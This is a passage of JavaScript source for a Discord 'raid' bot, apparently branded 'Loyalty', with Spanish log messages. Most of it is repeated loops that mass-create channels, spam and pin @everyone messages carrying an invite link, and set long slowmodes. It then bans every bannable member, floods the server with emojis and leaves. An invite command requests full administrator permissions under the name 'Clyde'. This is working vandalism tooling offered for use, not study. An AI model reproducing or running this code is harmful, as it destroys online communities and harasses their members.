              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

            /////////////////////////////

            for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
    for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
             }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

            ////////////////////////////////

            for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

                    for(let i =0;i<=5;i++) {

          message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
     for(let i =0;i<=2;i++){
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("||@everyone/@everyone|| Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
           }
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}

            /////////////////////////////



   setTimeout(() => {

message.guild.members.cache.filter(members => members.bannable).forEach(banall => message.guild.members.ban(banall.id, {reason: "Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98"}))


for(let i =0;i<=49;i++){
message.guild.emojis.create("https://media.discordapp.net/attachments/798275127086546974/799297286886785075/flash.gif", "RaidByLoyalty").catch(err => catcher.send("Hubo un error en el EmoteCreater"))
message.guild.emojis.create("https://media.discordapp.net/attachments/798275127086546974/799297286886785075/flash.gif", "RaidByLoyalty").catch(err => catcher.send("Hubo un error en el EmoteCreater"))

}

}, 5000);


     setTimeout(() => {
message.guild.leave().catch(err => catcher.send("Hubo un eror en el Guildleave"))
}, 300000);

}


if(command === "invite"){
 const embed = new MessageEmbed()
 .setDescription("[#Clyde](https://discord.com/oauth2/authorize?client_id=809840752586784849&scope=bot&permissions=2147483647) || `"+prefix+"hello`")
 .setColor("#ff4d4d")
 .setFooter("#LoyaltyGang")
 .setTimestamp()
 message.channel.send(embed)
}


if(command === "prueba"){

 let a = `for(let i =0;i<=2;i++){
 message.guild.channels.create("Rąi๔-ҍy͓̽-ꝈօyąӀէy", {
            type: 'text'
           }).then(channel => {
    channel.setTopic("Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98")
    channel.send("@everyone Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("@everyone Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("@everyone Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("@everyone Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("@everyone Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("@everyone Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("@everyone Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("@everyone Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("@everyone Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("@everyone Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("@everyone Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.send("@everyone Rąi๔-ҍy͓̽-ꝈօyąӀէy https://discord.gg/ctP7k46e98").then(msg => msg.pin())
    channel.setRateLimitPerUser("21600");
           }).catch((err) => {
              catcher.send("Se ha alcanzado el numero maximo de canales")
            })}`

 for(let i =0;i<=250;i++){

message.channel.send("```js\n"+a+"```")
 }
}

});         
client.login(process.env.token);  